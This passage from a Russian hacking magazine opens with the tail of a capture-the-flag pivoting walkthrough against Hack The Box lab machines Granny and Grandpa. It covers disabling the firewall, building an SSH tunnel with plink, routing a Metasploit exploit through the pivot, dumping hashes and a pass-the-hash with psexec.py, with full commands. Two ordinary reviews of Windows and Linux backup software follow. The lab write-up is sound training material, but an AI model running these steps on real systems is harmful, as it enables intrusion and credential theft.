это можно с помощью SSH‐туннеля от точки опоры до машины атакующего.
   «Почему бы в таком случае прос то не использовать bind_tcp вместо
дефолтного reverse_tcp и не замора чиваться с каким‐то там SSH?» —
можешь поинтересоваться ты. Действительно, так сделать можно, однако
обратные подклю чения всегда предпочтительнее: они надежнее с точки зре‐
ния безопасности (к bind‐шеллу может подключиться кто угодно), а файрволы
чаще ругаются именно на подозрительные вхо дящие соединения...


Ревер сивный проб рос пор тов
В последней ревизии Metasploit модуль portfwd (из сос тава Meterpreter)
обзавелся  опцией  ‐R,  которая  в  теории  поз воляет  конфигурировать
обратный проброс порта с жертвы на машину хакера. Таким способом тоже
можно было бы настроить прием данных от Granny, однако в этом кей се
у меня не получилось: portfwd отка зывался создавать релей, ругаясь именно
на флаг ‐R.



Если бы на ВМ Granny был уста новлен PowerShell, лучшим решением было бы
развернуть SSH‐сервер именно там и подключать ся к SSH с клиента Kali, ука‐
зывая при этом опцию ‐R (SSH Reverse Tunneling). Но, к сожалению, PS
на промежуточном хосте не оказалось, поэтому в роли сервера вынуждена
была выступить машина атакующего.


Отключаем файрвол
Чтобы пробросить SSH‐туннель c Granny до Kali, сперва придется отключить
файрвол на Windows Server. Сделать это можно толь ко с при вилегиями адми‐
на, поэтому мне пришлось снова вос пользоваться MS14‐070.





            Получа ем максимальные пра ва на футхолде

Теперь можно спавнить шелл и делать все, что душе угодно.



  C:\WINDOWS\system32>netsh firewall set opmode disable
  netsh firewall set opmode disable
  Ok.



PuTTY из кон соли
Создавать   туннель  будем   с  помощью   консольного  SSH‐клиента
для Windows — Plink (аналог PuTTY для командной строки). Его можно скачать
или просто найти в Kali, в раз деле готовых бинарей для винды.



  root@kali:~# locate plink.exe
  /usr/share/windows‐resources/binaries/plink.exe


Забросим Plink на Windows Server с помощью Meterpreter. Я выбрал дирек‐
торию, которая априори дос тупна для записи, — C:\Inetpub\wwwroot.



  meterpreter > upload plink.exe "c:\inetpub\wwwroot"
  [*] uploading  : plink.exe ‐> c:\inetpub\wwwroot
  [*] uploaded   : plink.exe ‐> c:\inetpub\wwwroot\plink.exe


Теперь создадим вспомога тельного пользователя snovvcrash на своей
машине (чтобы не поднимать туннель от имени root), зададим для него
пароль qwe123 и запустим SSH‐сервер.



  root@kali:~# useradd snovvcrash
  root@kali:~# passwd snovvcrash
  New password: qwe123
  Retype new password: qwe123
  passwd: password updated successfully
  root@kali:~# service ssh start


Еще я лишу этого пользователя воз можнос ти выполнять команды — изменю
дефолтный шелл на /bin/false в файле /etc/passwd. Выполнять команды
ему незачем, а вот безопас ность схемы от этого только повысится.





          Редактируем login‐шелл для пользователя snovvcrash

Теперь все готово и можно прокладывать SSH‐туннель. Из командной строки
Windows я выполню такую команду.



  C:\Inetpub\wwwroot>plink.exe ‐l snovvcrash ‐pw qwe123 ‐L
  10.10.10.15:8888:10.10.14.30:8888 ‐N 10.10.14.30





             Создание SSH‐туннеля от ВМ Granny до Kali

Это означает пример но следующее: «Granny, перенаправляй, пожалуйста,
все,  что поступит  в  порт 8888 интерфей са 10.10.10.15,  по  адре су
10.10.14.30:8888 через SSH‐туннель». Про верить работоспособность мож‐
но с помощью обыч ного nc.





          Проверяем работос пособность соз данного туннеля

Обращаю внимание, что бы не воз никло путаницы: туннель был соз дан
с опцией ‐L с хоста Granny, поэто му по отношению к машине атакующего он
будет «прямым». Если же пос мотреть на эту схему со стороны Kali, то туннель
логичнее называть «реверсивным».
   Теперь наша схема выглядит так.





            SSH‐туннель появился на схеме взаимодействия


Hack Grandpa!
Все готово, и можно (во второй раз) скомпрометировать систему Grandpa.
  Для этого я опять выберу экс плоит iis_webdav_scstoragepathfromurl,
но в этот раз его настройка будет нем ного отличать ся: на роль машины ата‐
кующего  (LHOST) я назначу хост Granny  (10.10.10.15), а в роли порта
для привязки хендлера (LPORT) выступит порт 8888 (через который все будет
отправляться на Kali по SSH‐туннелю).





  Взлом ВМ Grandpa с помощью iis_webdav_scstoragepathfromurl через ВМ
  Granny

После эксплуатации я повышу привилегии с помощью еще нас не подводив‐
шего MS14‐070.





               Эскалация привилегий на ВМ Grandpa

Можно открыть сессию Meterpreter и посмотреть информацию о системе.



  meterpreter > sysinfo
  Computer        : GRANPA
  OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
  Architecture    : x86
  System Language : en_US
  Domain          : HTB
  Logged On Users : 2
  Meterpreter     : x86/windows


Мы захватили пол ный контроль над Grandpa, не обменявшись с ним нап‐
рямую ни одним битом информа ции. Ура, задача решена!


Проб рос портов до локального сервиса
На сладкое рассмотрим еще один кейс перенаправления трафика.
  Файрвол на Grandpa никто не отклю чал, поэтому мы не можем так просто
получить доступ к его SMB‐ресурсу извне (в спис ке открытых портов Nmap
не было 445‐го, как ты помнишь). Однако вот что мы можем сделать:
с помощью Meterpreter пробросить свой локальный порт 445 с Kali до машины
Grandpa, вытащив таким образом на поверхность сервис SMB с Grandpa.



  meterpreter > portfwd add ‐l 445 ‐p 445 ‐r 127.0.0.1
  [*] Local TCP relay created: :445 ↔ 127.0.0.1:445


Этой командой я говорю, что локальный порт 445 (флаг ‐l) машины ата‐
кующего должен ассоциироваться с открытой сессией Meterpreter, а все, что
в него попадает, дол жно быть переда но на уда ленный порт 445 (флаг ‐p)
машины‐жертвы (флаг ‐r) по интерфейсу 127.0.0.1 (так как SMB дос тупен
локально на Windows Server). Если повторно запус тить Nmap и просканиро‐
вать 445‐й порт (заметь, уже на локалхосте) — о чудо, он окажется открытым!





            Сканируем проб рошенный с Grandpa 445‐й порт

То есть поверх уже настроенного в Metasploit маршрута мы пробросили порт
445 с машины атакующего до порта 445 на ВМ Grandpa, который прежде был
доступен только на loopback‐интерфейсе из‐за пра вил файрвола. В честь
этого завершим обновление нашей схемы вза имодействия, добавив на нее
проброс 445‐го порта.





        Проброс порта 445 с машины ата кующего до ВМ Grandpa


Pass-the-Hash
Так как это Windows Server 2003, тебе не сос тавит большого труда вскрыть
шару SMB, ведь здесь все еще акту альны LM‐хеши для хранения паролей.
А они ломаются на раз. Однако я пойду по еще более простому пути.





           Собираем дамп хешей паролей на ВМ Grandpa

Благодаря hashdump я могу сдампить пару хешей LMHASH:NTHASH из базы
данных SAM и провести ата ку Pass‐the‐Hash с помощью внешней утилиты
psexec.py, входящей в сос тав тулкита Impacket.



  root@kali:~# ./psexec.py ‐hashes
  '0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548' Ad‐
  ministrator@127.0.0.1
  Impacket v0.9.20 ‐ Copyright 2019 SecureAuth Corporation


  [*] Requesting shares on 127.0.0.1.....
  [*] Found writable share C$
  [*] Uploading file NNDHtRms.exe
  [*] Opening SVCManager on 127.0.0.1.....
  [*] Creating service tWni on 127.0.0.1.....
  [*] Starting service tWni.....
  [!] Press help for extra shell commands
  Microsoft Windows Version 5.2.3790 Copyright 1985‐2003 Microsoft Corp.


  C:\WINDOWS\system32>whoami
  nt authority\system


Теперь действительно всё.


        WWW

                   •A Pivot Cheatsheet for Pentesters
                         •Explore Hidden Networks With Double Pivoting
                    •Использование SSH SOCKS прок си совместно
                         с MSF Reverse TCP Payloads
ТРЮКИ
        СПАСИ
   И СОХРАНИ!

  СРАВНИВАЕМ ПОПУЛЯРНЫЕ ПРОГРАММЫ
        ДЛЯ РЕЗЕРВНОГО КОПИРОВАНИЯ





                                                                          Валентин Холмогоров
                                                                                              valentin@holmogorov.ru





«Полетел диск» — это всегда событие. Если оно происходит
в небе при большом стечении народа, впору ждать репор‐
тажей  по  телевидению  и  восторжен ных  комментариев
от уфологов. Если же это случилось на твоем компе, все
гораздо печальнее: придется кро потливо восстанавливать
потерянные файлы и надеяться, что самое ценное не погиб‐
ло безвозвратно. А можно этого и вов се избе жать, если ты
успел сделать резервные копии, для создания которых
человечес тво придума ло специальные автоматизирован ные
программы. Обзору самых популярных из них и посвящена
эта статья.


НО ШТИРЛИЦ УСПЕЛ СОХРАНИТЬСЯ
Необходимо заранее делать резервные копии самых ценных файлов —
это очевидно и дол жно у любого поль зователя вой ти в привычку, как мыть
руки перед едой или надевать шапку на морозе. Правда, любителей отмо‐
розить уши с годами меньше не становится, а потому компании, специали‐
зирующиеся на восстановлении данных, в боль шинстве своем не бедствуют.
Поистине золотой век для них наступил с началом массового распростра‐
нения троянов‐энкодеров, когда постра давшие, чьи файлы оказались зашиф‐
рованы вре доносными программа ми, ис числялись тысячами. Сейчас эпи‐
демии шифровальщиков вроде бы понемногу пошли на спад, но защищаться
от потери ценных данных по‐прежнему важно. Любая техника, к сожалению,
может сломаться. А некоторая — еще и внезап но.
  Очевидно и то, что копировать информа цию нужно на внешние накопи‐
тели, независимые от основного устрой ства хра нения данных. Если просто
сохранить файлы в соседнем раз деле жесткого дис ка, он с высокой долей
вероятности накроется вмес те с вин честером, если у того возникнут проб‐
лемы с аппаратной частью или логикой. Раньше для этих целей исполь‐
зовались оптические диски, но они, во‐первых, недол говечны, во‐вторых,
ограничены по объему и максимальному числу итераций записи, в‐третьих,
сама скорость обращения к оптическому накопителю очень невелика, в‐чет‐
вертых, пишущие приводы скоро можно будет отыс кать разве что в музее,
в‐пятых… Да и хватит, пожалуй. Уже перечис ленных причин достаточно
для того, чтобы ответственно заявить: оптика — прошлый век, хотя очень
многие компании (да и простые пользователи) до сих пор хранят архивы сво‐
их документов на DVD.





       Типичный архив бэкапов крупной компании. Пол день, XXI век

Флешки из‐за незначительных объемов и низкой скорос ти работы с шиной
USB тоже не слишком хорошо годятся для резервного копирования. Поэтому
оптимальный вариант — внешний жес ткий диск либо SSD‐накопитель,
облачное хранилище или уда ленный FTP‐сервер. Еще одним вариантом
может быть NAS — Network‐Attached storage, так называемое сетевое хра‐
нилище. По сравнению с внешним вин честером оно выигрывает тем, что
не требует непосредственного подключения к компьютеру: NAS — сам
по себе мини‐компьютер, основная задача которого заключается в организа‐
ции обме на данными по сети и записи их на диск или RAID‐массив. Прошивка
NAS, как правило, базиру ется на каком‐либо сильно обре занном варианте
Linux.
   Устройство тихо живет себе в локальной сети, играя роль сетевого фай‐
лообменника, на который можно закачать что угодно, этим и удобно — к нему
можно обратиться в любой момент, нап ример автоматически скопировать
на него файлы по расписанию или во время прос тоя рабочего компьютера.
В этом кроется и один из недос татков NAS: большинс тво троянов‐энкодеров
прекрасно  умеет шифровать  содержимое  присоединенных  к  Windows
сетевых папок, да и в прошивке самих хранилищ иногда обнаруживаются уяз‐
вимости, которыми пользуются зло умышленники. Так, в 2014 году троян
под  названием   Trojan.Encoder.737  шифровал  файлы,  размещенные
на сетевых хранилищах производс тва одной извес тной компании, и тре бовал
за их восстановление 350 долларов. Проникал он туда, используя уязвимость
в прошивке девайса. Раз работчик быстро залатал дыру, но те пользователи,
что не успели вовремя обновиться, все‐таки пострадали от этой угрозы.
   Теперь давай разберемся с тем, какие типы резервных копий вообще
бывают на све те. Чаще всего встречаются три варианта:
 • полное копирование — когда соз дается полная копия всех выбранных
   данных;
 • инкрементное копиро вание — когда в копию добавляются только файлы,
   измененные с момента любого последнего копирования;
 • дифференциальное — добавление в архив только данных, изменившихся
   с момента сох ранения пос ледней полной копии.

Итак, представим себе, что место, где мы собира емся хранить резервные
копии, у нас есть: это внешний диск, NAS или обла ко. Но больше всего внед‐
рить резервное копирование в повседневную практику мешает эле ментарная
лень. Действительно: нужно ведь отвлечь ся от любимых игрушек, вспомнить,
какие файлы поменялись с момента соз дания пос ледней резервной копии,
загрузить их в хранилище… Нап рашивается прос тое решение: максимально
автоматизировать этот процесс с помощью подходяще го ПО. И если в mac‐
OS есть, например, встроенное приложение для резервного копирования
Time Machine, то разработчики винды такого удоб ного инс трумента в составе
ОС не предусмотрели, и счас тливым пользователям этой платформы при‐
ходится искать продукты сторонних раз работчиков.
  Иными словами, нам нужно найти подходящую программу — в идеале
бесплатную,  поддерживающую  работу  по  рас писанию, име ющую  воз‐
можность сохранять копии в сети или в обла ке и желательно включающую
максимальное число типов резервного копирования (лучше все го все три).
Итак, что нам предлагает рынок?


ACRONIS TRUE IMAGE
О продукции компании Acronis слышали, наверное, все. Логотипы этой фир‐
мы красуются на болиде «Формулы‐1» российского пилота Даниила Квя та,
да и в интернете рекламы Acronis хва тает. Собственно, контора на протяже‐
нии всей своей истории специализиру ется на раз работке софта для резер‐
вного копирования и потому дос тигла на этом поприще определенных успе‐
хов. Для домашних пользователей компания предлагает программу Acronis
True Image, распростра няющуюся как в виде лицензионной версии, рассчи‐
танной на одну установку, так и по подписке.
  В возможности базовой версии приложения входит копирование образа
диска или выбранных файлов в указанное пользователем хранилище, вос ста‐
новление данных из резервной копии, кло нирование дисковых раз делов
и защита от шифроваль щиков (приложение отслеживает запущенные в сис‐
теме процессы и предупрежда ет пользователя при попытке шифрования
файлов: потенциально опас ный про цесс поль зователю предложат заб‐
локировать). Покупателям подписки ста новится также дос тупно облачное
хранилище на серверах Acronis объемом 250 Гбайт (или 1 Тбайт, в зависи‐
мости от того, насколько ты готов рас кошелить ся).





                              Acronis True Image

Сама по себе программа в версии 2020 может похвастаться понятным
и удобным пользовательским интерфейсом: выбираешь локальный диск
и файлы, резервную копию которых требуется соз дать, показываешь, куда
выгружать архив, причем в качестве мес та назначения можно выбрать под‐
клю ченное локально устройство, уда лен ный FTP‐сервер, NAS или любое
облако, и… И, собственно, все. При желании резервную копию можно зашиф‐
ровать, а в разделе «Активность → Параметры» — задать расписание и схе му
резервного копирования выбранных объектов.
  Поддерживаются все три воз можные схемы копирования, также можно
настроить исключения для объектов, которые копировать не нужно, и указать
периодичность создания полной копии.





        В Acronis True Image можно задать режим копирования

Удобством исполь зования дос тоинства  Acronis  True Image, собс твенно,
и ограничиваются, в то время как самый сущес твенный недостаток прог‐
раммы — коммерческая лицензия. Если срок ее действия закончился, вос‐
становить данные из резервной копии ты уже не сможешь. Кроме того, если
ты перестал оплачивать подписку, копии в облаке Acronis тоже через некото‐
рое время будут удалены. Надежен ли такой инструмент хранения копий?
Каждый волен дать собственный ответ, а мы тем временем поищем бес плат‐
ную альтернативу это му приложению.


AOMEI BACKUPPER STANDARD
Это полностью бесплатная для домашнего использования программа с прос‐
тым и понятным интерфейсом, которую можно ска чать, например, с сай та.
Приложение позволя ет создавать копии диска целиком, отдельных его раз‐
делов, только системных файлов или указанных пользователем файловых
объектов. Доступен режим клонирования диска или его логичес кого раздела.
В качестве места расположения архива можно выб рать локальный, сетевой
диск или облачное хранилище.





                 Так выглядит AOMEI Backupper Standard

Из дополнительных опций AOMEI Backupper Standard: возможность запус тить
указанный пользователем batch‐скрипт перед началом или после окончания
копирования, задать степень сжатия архива и настроить разбиение его
на тома. Шифрование резервной копии доступно только в коммерчес кой
версии программы.
  Можно настроить соз дание резервных копий по расписанию: однократно,
ежедневно или в заданном временном интерва ле, причем для этого пред‐
лагается использовать как стандартный планировщик заданий Windows, так
и встроенную службу приложения.





              Планировщик в AOMEI Backupper Standard

Программа име ет в своем арсенале полное и инкрементное копирование,
дифференциальный режим  подключается  в коммерчес кой  версии  уже
за деньги. Кроме того, в AOMEI Backupper Standard отсутствует под держка
русского языка, однако интерфейс программы нас только очевиден и прост,
что даже неподготов ленному пользователю вполне можно обойтись и без
него. Загрузку файлов на FTP‐сервер прог рамма, к сожале нию, не под держи‐
вает.
  В целом базовых, бесплатных функций AOMEI Backupper Standard вполне
достаточно для того, чтобы заменить жадный до денег Acronis True Image
на домашнем компьютере или ноут буке.


PARAGON BACKUP & RECOVERY
Компания Paragon Software хорошо извес тна поль зователям во всем мире
своим  замечательным  приложением  Partition  Magic,  предназначенным
для гибкого управления логичес кими разделами жесткого дис ка. Но есть
у этого разработчика и бесплатная программа для резервного копирования
Paragon Backup & Recovery Community Edition.





              Ин терфейс Paragon Backup & Recovery

Программа доволь но‐таки прос та в нас трой ках и поддерживает все тот же
набор базовых функций, что и ее основные конкуренты. Копировать можно
диск целиком, указанный раздел или выб ранный пользователем набор фай‐
лов и папок. Также можно выбрать для копирования определенные типы фай‐
лов на указанном диске: документы, музыку и видео, причем для каждого
из этих типов можно ука зать необ ходимые рас ширения. Копии можно сох‐
ранять в локальной или сетевой папке; облачные хра нилища и FTP в бесплат‐
ной версии приложения не поддерживаются. Не поддерживается и русский
язык.
  В бесплатной версии имеется возможность выполнять все три вида
резервного копирования: полное, инкрементное и дифференциальное. Мож‐
но настроить расписание: запуск копирования ежедневно, еженедельно,
ежемесячно или при старте системы. Одна ко шифрование резервных копий
в этой редакции Paragon Backup & Recovery отсутству ет.


IPERIUS BACKUP FREE
Бесплатная версия программно го комплекса Iperius Backup, предназначен‐
ного для создания резервных копий в среде Microsoft Windows, включая Win‐
dows 10 и Windows Server. Скачать программу можно с сай та раз работчика.





                     Так выглядит Iperius Backup Free

В бесплатной версии Iperius Backup воз можнос ти урезаны: можно выб рать
для копирования отдельные файлы и папки на локальном либо сетевом диске
и скопировать архив опять же в локальную или сетевую папку. Копирование
на FTP‐сервер или в облако в бесплат ной вер сии не поддерживается. Ком‐
мерческая редакция Iperius Backup также может копировать диск или раздел
целиком, данные с FTP, виртуальные машины Hyper‐V, данные Microsoft Ex‐
change и различные СУБД.
  В приложении имеется планировщик, с помощью которого можно нас тро‐
ить копирование в заданное время — ежедневно, еженедельно, по дням
недели или опре деленным датам. В нас трой ках имеется возможность нас‐
троить способ сжатия архива, ведения лог‐файлов, добавлять или исключать
из бэкапа системные и скрытые файлы. Можно настроить отправку сооб‐
щения по электронной почте при завершении копирования, а также запуск
произвольной программы или скрипта до или пос ле соз дания резервной
копии. Шифрование архива в бесплатной версии недос тупно, зато прог‐
рамма оснащена русскоязычным интерфейсом, что уже неплохо.
  Признаться, я довольно долго искал в нас трой ках Iperius Backup опции
создания самого архива — оказалось, что они спрятаны в меню диалогового
окна «Добавить/создать папку назначения». Именно там можно выб рать,
как именно мы будем упаковывать наши данные, — оказывается, программа
поддерживает не только полное, но и инкрементное и дифференциальное
копирование. Там же можно включить ZIP‐сжатие и указать пароль для архи‐
ва: полноценное шифрование бэкапа эта опция, конечно, не заменит, но все
же парольная защита лучше, чем вообще ничего.





  Если порыться в настройках Iperius Backup Free, можно найти много
  интересного…

Вывод в целом можно сделать такой: возможности приложения выглядят
вполне привлекательными, но все портит довольно‐таки мудреный и запутан‐
ный интерфейс, половина кнопок в котором при нажатии предлагает купить
полную версию программы. Но если потратить время и разобраться в ее бес‐
платных возможностях, их окажет ся вполне достаточно, чтобы закрыть боль‐
шинство базовых потребностей.


EASEUS TODO BACKUP FREE
Это еще одна бесплатная программа от компании EaseUS, скачать при ложе‐
ние можно с ее сайта. Сво бодно распростра няемая вер сия также име ет ряд
ограничений: не поддерживается отдельное копирование архивов электрон‐
ной почты Outlook и соз дание расписания, основанного на событиях, —
запуск можно настроить только по времени. Поддержка рус ского языка
отсутствует во всех версиях продукта.





                 А это — EaseUS Todo Backup Free

Что, безусловно, порадовало, так это возможность шифрования бэкапа
с заданным паролем. Можно также вклю чить посекторное копирование выб‐
ранного раздела — по‐моему, эту опцию не поддерживает ни одна другая
бесплатная программа.
  Запуск  резервного  копирования  настраивается  по  дням,  неделям
или месяцам. Созданный архив можно поместить на локальный или сетевой
диск, в сетевое хранилище NAS или в облачное хранилище (если оно опять
же подключено к компьютеру как диск). Копирование на удаленный FTP‐сер‐
вер доступно только в плат ной версии.
  Отдельная функция прог раммы — System Backup — создание образа
установленной на компьютере операци онной системы. Todo Backup Free
сама определяет тип ОС и поз воляет сохранить ее для быстрого разверты‐
вания. А еще можно настроить копиро вание толь ко отдельных файлов с ука‐
занных дисков. К сожалению, выбор типов файлов по маске или рас ширению
бесплатным пользователям недос тупен.





      Выборочное копирование файлов в EaseUS Todo Backup Free

Кроме всего прочего, в этой версии продукта дос тупна функция клониро‐
вания диска или логического раздела в виде пошагового мас тера, а в допол‐
нительных настрой ках Todo Backup Free можно найти средства для проверки
ранее созданного обра за диска, а также для создания загрузочной флешки
или CD с WinPE или Linux. К сожалению, я не нашел в настройках программы
возможности создавать инкрементную и дифференциальную копию — такое
ощущение, что Todo Backup Free умеет работать только с полной. Ну и пос‐
леднее: при беглом знакомстве с этим при ложением у меня создалось впе‐
чатление, что по сравнению с конкурентами оно явно тормозит. На мощ ном
компьютере это, возможно, будет не слишком заметно, но на нетбуке с огра‐
ниченными аппаратными ресурсами Todo Backup  Free может и вовсе
повесить систему. Будь осторожен.


ВЫВОДЫ
А теперь давай сведем информа цию по всем рас смотренным при ложениям
в табличку.





            Сравнение программ резервно го копирования

Если не брать в расчет коммерчес кий Acronis True Image, из бес платных про‐
дуктов наиболее интересными по ассортименту предлагаемых функций выг‐
лядят русскоязычный Iperius Backup Free и AOMEI Backupper Standard. Второй
при этом обладает более простым и интуитивно понятным интерфейсом,
но не умеет шифровать или защищать паролем резервные копии. Если же
тебе необходимо шифрование, но при этом достаточно только простого
копирования файлов без воз можнос ти создания инкрементных или диф‐
ференциальных  копий, можно воспользоваться бесплатной программой
EaseUS Todo Backup Free.
ТРЮКИ

 ЗАПАСЛИВЫЙ
   ПИНГВИН

    ПРОГРАММЫ ДЛЯ РЕЗЕРВНОГО
        КОПИРОВАНИЯ В LINUX





Недавно мы писали про утилиты для резер‐
вного  копирования  в  Windows,  одна ко
у линуксоидов бэкапы тоже насущная проб‐
лема. Настало время восста новить спра‐
ведливость и пос мотреть, какие средства         Ксения Кирилова                                                                                              Desperately in love with Linux
позволяют спасать цен ные данные от раз‐            kclo3@icloud.comand C
ных напастей, если на компьютере уста нов‐
лен один из дис трибутивов Linux.


НАРОДНЫЕ МУДРОСТИ
На базе Linux любят раз ворачивать NAS‐ и FTP‐серверы. Для таких сис тем
неплохо бы иметь резервную копию как минимум конфигурации, а в идеале
еще и данных. Не стану читать очередную лекцию, насколько важно оза‐
ботиться резервным копиро ванием до того, как с основным носителем
информации приключит ся беда. Но повторю одну притчу из айтишного фоль‐
клора: люди делятся на тех, кто делает бэкапы, и тех, кто их еще не делает.
С основами создания резервных копий ты можешь ознакомиться, например,
в упомянутой статье, а мы не будем тратить время на теорию и сразу перей‐
дем к делу.


           WARNING

                   В одной  статье  всех существующих решений
                       для резервного копирования не обозреть, поэто‐
                     му мы рассмотрели и сравнили наиболее извес‐
                      тные из них. Если тут нет твоей любимой прог‐
                   раммы — не обессудь.


Самое что ни на есть хардкорное резервное копирование данных с носите‐
лей можно выполнить командой dd. И самое при кольное, что можно примон‐
тировать получившийся образ и работать с ним как с обычным разделом
в режиме чтения и записи. Никаких тебе DAEMON Tools или Alcohol для эму‐
лирования дисковода...





        Снимаем слепок устройства /dev/sdb1 и монтируем его

Подобные способы подкупают своей простотой и удобством создания резер‐
вной копии. К тому же не надо беспоко иться, что слетят права и прочие атри‐
буты файлов или испортятся символичес кие ссылки. Еще можно примон‐
тировать, например, Яндекс.Диск и сра зу закидывать бэкапы на него. Но это
кажется удобным лишь до поры до времени, пока не требуется ставить соз‐
дание бэкапов на поток, а нужно лишь снять образ с флешки или диска.
Для более серьезных задач в Linux уже сущес твует достаточное количество
утилит, делающих процесс резервного копирования с пос леду ющим восста‐
новлением почти таким же простым (ну, пос ле некоторой подготовки), как в
винде или в macOS, поэтому вместо изобретения еще одного велосипеда
давай‐ка лучше изучим готовые.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
       ЗАПАСЛИВЫЙ
          ПИНГВИН
                  ПРОГРАММЫ ДЛЯ РЕЗЕРВНОГО
                         КОПИРОВАНИЯ В LINUX





ТЕМ, КТО ЛЮБИТ ПОМОЩНЕЕ
Ты гик или админишь что‐то пос ложнее сети из двух с половиной хос тов? Тог‐
да специально для тебя мы рас смотрим сперва исконно линуксовые, слож‐
ные и не всегда понятные с первой попытки программы для создания
бэкапов. Начнем, пожалуй, с клас сики.


rsync
Ходят легенды, что rsync, появившаяся в 1996‐м и даже портированная
в 1999‐м на NT, была разработана для замены rcp (remote copy). А имя ее
произошло от словосочетания remote synchronization, для чего она и была
предназначена.
   Утилита вклю чена во все популярные дистрибутивы Linux; существуют вер‐
сии  для  систем BSD, macOS и  Windows. Эта  свободная  программа
с интерфейсом командной строки предос тавля ет широкие возможности син‐
хронизации локальных и уда ленных файлов с исполь зованием собственного
алгоритма, уменьшающего объем пересылаемо го трафика. Она применяется
для создания зеркал и резервных копий — полных, инкрементных и при
желании (вот один из гайдов) дифференциальных. Для автоматизации можно
настроить расписание с помощью задач cron. При передаче на удаленные
хосты rsync умеет использовать раз ный транспорт, в том числе rsh, SSH
и сырые сокеты с собственным протоколом rsync. Можно указывать, какие
файлы не следует синхронизировать, перечислив их имена, размер и не толь‐
ко; можно ограничивать скорость передачи данных и использовать множес‐
тво других настроек.





  Вот так один маленький слеш в конце пути‐источника решает, будет ли
  создаваться папка в назначении

Rsync позволяет создать демон, своего рода удаленный сервер  rsync,
который также можно сконфигурировать совершенно по‐раз ному в зависи‐
мости от поставленной задачи. Он может принимать удаленные соединения
анонимно, по паролю и без, с шифровани ем по SSH на заданном порте
с использованием клю чей, с раз ными конфигура циями для разных поль‐
зователей, создаваемых в рамках rsync... При всем этом для успешного
общения двух узлов демон rsync необязателен: раз ница между исполь‐
зованием демона и работой без него разъясняется на сайте проекта.
  Опции настрой ки демона описаны в man rsyncd.conf, а примеры исполь‐
зования программы также представлены на сайте.
  В мануале описано множество нюансов работы с этим мощ ным инстру‐
ментом, таких как обра ботка символичес ких ссы лок и атрибутов файлов,
опции удаления файлов при обновлении директорий, параметры пересылки
данных и многое другое, что и в голову так прос то не придет. В общем,
в любой непонятной ситуации — RTFM!


luckyBackup
Графическая утилита, построенная на осно ве  rsync. LuckyBackup уме ет
делать резервные копии и выполнять син хро низацию, работать с удаленными
хостами и экономить трафик, переда вая лишь изменения в данных, гиб ко
настраивается (ну еще бы, ведь это потомок rsync). Внезапно (для меня) под‐
держивает русский интерфейс.
  Для резервного копирования в luckyBackup соз даются профили, внутри
которых можно довольно тонко определить задачи:
 • тип (бэкап или синхро низа ция) и описание задачи;
 • правила копирования определенных директорий: настройка исключений
   по шаблонам, можно задать их самос тоятельно или использовать име‐
   ющиеся; включений, которые должны быть обязательно скопированы;
 • настроить исполь зование удален ного узла в качес тве источника или места
   назначения, с SSH или без;
 • сохранение метаданных файлов, обработка ссы лок и специальных фай‐
   лов, в том числе по пользовательским шаблонам;
 • команды оболочки,  которые  необ ходимо  выпол нить  до  или  после
   исполнения задачи;
 • можно просмотреть команду rsync, которая будет запуще на для выпол‐
   нения созданной задачи.

Задачи можно вклю чать или отклю чать, тыкая курсором мыши в чекбокс
рядом  с ее  названи ем. Профили мож но  экспортировать  (почему бы
не  забэкапить  профиль  программы  бэкапа?).  Контекстная  справка
при наведении курсора помогает простому смертному не затеряться в рас‐
ширенных опциях.





              Расширенная настройка задач в luckyBackup


Back In Time
Утилита с набором функций, очень похожим на luckyBackup. Тоже поддержи‐
вает профили, но экспортировать их нельзя, и внут ри них нет задач — здесь
профиль и есть задача.
   Back In Time может использоваться в консольном или GUI‐исполнении.
Предлагает обычные или шифрованные EncFS копии, которые могут хранить‐
ся локально или передаваться по SSH. Позволя ет создавать бэкапы по дням
и по часам, при включении компь ютера и при подключении устрой ств,
для чего использует cron или правила udev.
  Можно настроить уда ление старых бэкапов по их возрасту и количеству
свободного места или инод (inodes). Да‐да, иноды тоже могут закончиться,
и тогда ты не сможешь создать файл, даже если есть место на диске. Вкладка
Expert Options содержит набор рас ширенных опций для rsync. Бэкапы ути‐
лита сохраняет в виде архивов.





                 Нас трой ки про филя в Back In Time


Bacula
Опенсорсный монстр для резервного копирования. Его можно собрать
из исходников, однако готовые пакеты последних версий с сайта разработ‐
чиков просто так не получишь. Bacula обещает мощ ную функциональность —
программа не в последнюю очередь ориенти рована на работу в крупных
компьютерных сетях и вообще на мас штабирование; она умеет делать все
три  вида  бэкапов. Имеются  версии  для  Windows  (есть даже  клиент
под Win98!), macOS и Open/NetBSD.
   Bacula придерживается клиент‐серверной архитектуры для организации
хранения резервных копий, то есть подразумевает использование отдель‐
ного сервера, на который клиентские машины скидывают свои бэкапы. Тем
не менее можно настро ить ее так, чтобы она работала целиком на одном
компьютере.
   Bacula состоит из следующих компонентов:
 • директора (Director), который централизованно следит за все ми опе раци‐
  ями резервирования и восста новления;
 • консоли (Console), с помощью которой пользователь управляет дирек‐
   тором. Может исполь зовать командную стро ку или GUI;
 • файлового демона (File) — клиента, который уста навливается на клиент‐
   ской машине и обменивается данными с директором;
 • демона хранилища (Storage), сос тоящего из прог рамм, заведующих хра‐
   нением и управлением файлами бэкапов;
 • каталога  (Catalog), в котором хранятся данные о резервных копиях.
  Для него Bacula исполь зует MySQL, PostgreSQL или SQLite;
 • монитора (Monitor) для просмотра текущего состояния перечис ленных
   компонентов.

Так что сделать резервную копию одной‐единс твенной командой в случае
с Bacula не получится. Для успешной работы всей сис темы бэкапа должны
быть настроены директор, файловый демон, демон хранилища и каталог.
Такая модульность позволяет гиб ко ее конфигурировать и даже разворачи‐
вать отдельные компоненты на разных серверах. Администрировать весь этот
комбайн возможно через консоль или какую‐либо графическую надстройку
(например, Bacula Administration tool), но первоначально необходимо создать
и отредактировать файлы конфигов основных компонентов.
  Для более удобного прос мотра статистики Bacula умельцы разработали
инструмент Bacula‐Web на базе PHP, но это не единс твенный веб‐интерфейс,
который можно прикрутить к Bacula.





     Один из доступных веб‐интерфейсов. Скрин шот с www.bacula.org

Есть, однако, у Bacula и минусы — вся инфраструктура упадет при отказе
директора. Плюс раньше при изменении в файле даже пары байтов она
бэкапила весь файл, вмес то того чтобы сохранить только дельту. В свое вре‐
мя из‐за подобных вещей, а также из‐за коммерци ализации у Bacula появи‐
лись форки:
 • Burp (нет, это другой Burp, не Burp Suite). Его автору надоело, что Bacula
   такая большая и местами неповоротливая;
